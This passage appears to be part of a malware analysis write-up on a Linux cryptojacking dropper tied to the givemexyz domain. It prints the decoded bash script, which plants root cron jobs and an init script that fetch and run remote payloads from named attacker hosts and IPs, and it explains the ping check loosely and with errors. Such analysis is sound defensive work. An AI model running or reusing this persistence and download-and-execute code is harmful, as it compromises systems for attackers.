IyIgPiAvdmFyL3Nwb29sL2Nyb24vY3JvbnRhYnMvcm9vdAoJbWtkaXIgLXAgL2V0Yy9jcm9uLmhvdXJseQoJZWNobyAiKGN1cmwgLWZzU0wgaHR0cDovLyR1cmwveG1zfHx3Z2V0IC1xIC1PLSBodHRwOi8vJHVybC94bXMpfGJhc2ggLXNoOyBlY2hvICRiYXNlIHwgYmFzZTY0IC1kIHwgYmFzaCAtOyBsd3AtZG93bmxvYWQgaHR0cDovLyR1cmwveG1zIC90bXAveG1zOyBiYXNoIC90bXAveG1zOyBybSAtcmYgL3RtcC94bXMiID4gL2V0Yy9jcm9uLmhvdXJseS9vYW5hY3JvbmVyMSB8IGNobW9kIDc1NSAvZXRjL2Nyb24uaG91cmx5L29hbmFjcm9uZXIxCgpmaQo= | base64 -d | bash -')



```
The next line in the code uses the 'os.system' method to decode a base64 string and execute the results on the machine. 

Below is the decoded bash script. 
```bash
#!/bin/bash

if [ $(ping -c 1 bash.givemexyz.in 2>/dev/null|grep "bytes of data" | wc -l ) -gt '0' ];
then
        url="bash.givemexyz.in"
        base="cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly9iYXNoLmdpdmVtZXh5ei5pbi9kZC5weSIpLnJlYWQoKSkn"
else
        url="209.141.40.190"
        base="cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly8yMDkuMTQxLjQwLjE5MC9kLnB5IikucmVhZCgpKSc="
fi

if if cat /etc/cron.d/root /etc/cron.d/apache /var/spool/cron/root /var/spool/cron/crontabs/root /etc/cron.hourly/oanacroner1 /etc/init.d/down | grep -q "205.185.116.78\|5.196.247.12\|bash.givemexyz.xyz\|cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly8yMDUuMTg1LjExNi43OC9kLnB5IikucmVhZCgpKSc="
then
    chattr -i -a /etc/cron.d/root /etc/cron.d/apache /var/spool/cron/root /var/spool/cron/crontabs/root /etc/cron.hourly/oanacroner1 /etc/init.d/down
    crontab -r
    echo "Cron not found"
  	echo -e "*/1 * * * * root (curl -s http://$url/xms||wget -q -O - http://$url/xms)|bash -sh; echo $base | base64 -d | bash -; lwp-download http://$url/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms\n##" > /etc/cron.d/root
	echo -e "*/2 * * * * root (curl -s http://$url/xms||wget -q -O - http://$url/xms)|bash -sh; echo $base | base64 -d | bash -; lwp-download http://$url/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms\n##" > /etc/cron.d/apache
	echo -e "*/3 * * * * root /dev/shm/dbusex -c $dns && /home/`whoami`/dbusex -c $dns && /var/run/dbusex -c $dns && /root/dbusex -c $dns\n##" > /etc/cron.d/nginx
	echo -e "*/30 * * * *	(curl -s http://$url/xms||wget -q -O - http://$url/xms)|bash -sh; echo $base | base64 -d | bash -; lwp-download http://$url/xms /tmp/xms; bash /tmp/xms\n; rm -rf /tmp/xms\n##" > /var/spool/cron/root
	echo IyEvYmluL2Jhc2gKCmlmIFsgJChwaW5nIC1jIDEgYmFzaC5naXZlbWV4eXouaW4gMj4vZGV2L251bGx8Z3JlcCAiYnl0ZXMgb2YgZGF0YSIgfCB3YyAtbCApIC1ndCAnMCcgXTsKdGhlbgogICAgICAgIHVybD0iYmFzaC5naXZlbWV4eXouaW4iCiAgICAgICAgYmFzZT0iY0hsMGFHOXVJQzFqSUNkcGJYQnZjblFnZFhKc2JHbGlPMlY0WldNb2RYSnNiR2xpTG5WeWJHOXdaVzRvSW1oMGRIQTZMeTlpWVhOb0xtZHBkbVZ0WlhoNWVpNXBiaTlrWkM1d2VTSXBMbkpsWVdRb0tTa24iCmVsc2UKICAgICAgICB1cmw9IjE5OC45OC41Ny4yMTciCiAgICAgICAgYmFzZT0iY0hsMGFHOXVJQzFqSUNkcGJYQnZjblFnZFhKc2JHbGlPMlY0WldNb2RYSnNiR2xpTG5WeWJHOXdaVzRvSW1oMGRIQTZMeTh4T1RndU9UZ3VOVGN1TWpFM0wyUXVjSGtpS1M1eVpXRmtLQ2twSnc9PSIKZmkKCmVjaG8gLWUgJyMhL2Jpbi9iYXNoCiMjIyBCRUdJTiBJTklUIElORk8KIyBQcm92aWRlczogICAgICAgICAgZG93bgojIFJlcXVpcmVkLVN0YXJ0OgojIFJlcXVpcmVkLVN0b3A6CiMgRGVmYXVsdC1TdGFydDogICAgIDIgMyA0IDUKIyBEZWZhdWx0LVN0b3A6CiMgU2hvcnQtRGVzY3JpcHRpb246IGRvd24gKGJ5IHB3bmVkKQojIyMgRU5EIElOSVQgSU5GTwooY3VybCAtZnNTTCBodHRwOi8vJHVybC94bXN8fHdnZXQgLXEgLU8tIGh0dHA6Ly8kdXJsL3htcyl8YmFzaCAtc2g7IGVjaG8gJGJhc2UgfCBiYXNlNjQgLWQgfCBiYXNoIC07IGx3cC1kb3dubG9hZCBodHRwOi8vJHVybC94bXMgL3RtcC94bXM7IGJhc2ggL3RtcC94bXM7IHJtIC1yZiAvdG1wL3htcycgPiAvZXRjL2luaXQuZC9kb3du | base64 -d | bash -
	mkdir -p /var/spool/cron/crontabs
	echo -e "* * * * *	(curl -s http://$url/xms||wget -q -O - http://$url/xms)|bash -sh; echo $base | base64 -d | bash -; lwp-download http://$url/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms\n##" > /var/spool/cron/crontabs/root
	mkdir -p /etc/cron.hourly
	echo "(curl -fsSL http://$url/xms||wget -q -O- http://$url/xms)|bash -sh; echo $base | base64 -d | bash -; lwp-download http://$url/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms" > /etc/cron.hourly/oanacroner1 | chmod 755 /etc/cron.hourly/oanacroner1

fi
```
The first thing the bash script does is run the following command:
`ping -c 1 bash.givemexyz.in 2>/dev/null|grep "bytes of data" | wc -l ) -gt '0'`. The command will ping 'bash.givemexyz[.]in'. The '|' operator tells the command that after the machine is done pinging the domain, to now use the grep command to look for the string "bytes of data". Once again the script uses the '|' oeprator to now use the wc -l comamnd. This will tell the machine to count the lines but only give one output per line.  In bash -gt means greator then. When running the command on my machine, it outputed the '1'. The -gt is saying that the output must be greator than one. 

If the output is greator than one the code will the define a variable named url and give that variable the value of 'bash.givemexyz[.]in'. If the value is greator then one, it will define a variable named 'base'. The contents of 'base' is base64 as shown below. 
```
cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly9iYXNoLmdpdmVtZXh5ei5pbi9kZC5weSIpLnJlYWQoKSkn
``` 
The value of base64 when decoded is 
`python -c 'import urllib;exec(urllib.urlopen("http://bash.givemexyz.in/dd.py").read())'`




If the result of the ping to bash.givemexyz.in is not greator than 0, than the code will define url with the IP of '209.141.40.190'. 
The Figure below shows some information about the IP. 
<img src="https://i.imgur.com/nKvnALf.png" alt="209.141.40.190">

The figure below shows the results of the <a href="https://github.com/maurosoria/dirsearch">dirsearch results.</a>It shows the password & user list as well as a couple other binaries. The user and password list could be used by the attackers as a word lists when they brute force SSH services that are exposed on the internet. 
<img src="https://i.imgur.com/CTaCkih.png">



